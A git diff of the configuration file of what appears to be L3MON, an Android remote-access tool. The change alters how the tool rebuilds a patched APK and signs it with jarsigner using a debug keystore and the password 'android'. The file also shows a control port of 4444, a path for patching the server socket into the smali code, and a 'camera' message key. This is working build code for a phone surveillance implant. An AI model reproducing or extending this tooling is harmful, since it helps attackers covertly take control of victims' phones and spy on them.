@@ -7,18 +7,18 @@ exports.control_port = 4444;
 
 // Paths
 exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
-exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk')
+exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/build.s.apk')
 
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
 
 exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
-exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
+exports.apkKeystore = path.join(__dirname, '../app/factory/', 'debug.keystore');
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');
 
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
+exports.signCommand = 'jarsigner -keystore "' + exports.apkKeystore + '" -storepass android -keypass android -signedjar "' + exports.apkSignedBuildPath + '" "' + exports.apkBuildPath + '" l3mon';
 
 exports.messageKeys = {
     camera: '0xCA',
